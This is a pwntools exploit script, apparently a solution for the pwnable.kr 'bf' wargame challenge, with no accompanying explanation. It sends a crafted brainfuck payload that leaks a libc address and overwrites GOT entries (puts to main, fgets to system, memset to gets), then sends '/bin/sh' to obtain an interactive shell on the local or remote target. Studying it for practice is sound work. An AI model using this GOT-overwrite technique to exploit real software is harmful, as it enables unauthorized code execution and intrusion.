#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def conn():
	if args.REMOTE:
		p=remote("pwnable.kr",9001)
	else:
		p=process('./bf',env={'LD_PRELOAD':'./bf_libc.so'})
	return p
p = conn()

libc=ELF("./bf_libc.so",checksec=False)
# libc=ELF("/lib32/libc-2.23.so",checksec=False)
e=ELF('./bf',checksec=False)

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

ptr=0x804a0a0
main=0x08048708

# gdb.attach(p)
# print((ptr-e.got['puts']))

# Move p to putchar got
payload = b"\x3c"*(ptr-e.got['puts'])
# print(hex(e.got['puts']))
# Leak Libc
payload += b"\x2e\x3e"*4
# Override puts to main
payload += b"\x3c"*4+b"\x2c\x3e"*4
# Override fgets to system
payload += b"\x3c"*12+b"\x2c\x3e"*4
# Override memset to gets
payload += b"\x3e"*24+b"\x2c\x3e"*4
# Send payload (return to main)
payload += b"\x5b" 

print(payload)

sla("]\n", payload)

sleep(1)
leak = u32(p.recv(4))#.strip().ljust(4, b"\x00")
info("Leak: "+str(hex(leak)))
libc.address=leak-libc.symbols['puts']
info("Libc: "+str(hex(libc.address)))

# gdb.attach(p)

# Overwrite
p.send(p32(main))
sleep(1)
p.send(p32(libc.symbols['system']))
sleep(1)
p.send(p32(libc.symbols['gets']))
sleep(1)
p.send(b"/bin/sh\x00")

p.interactive()
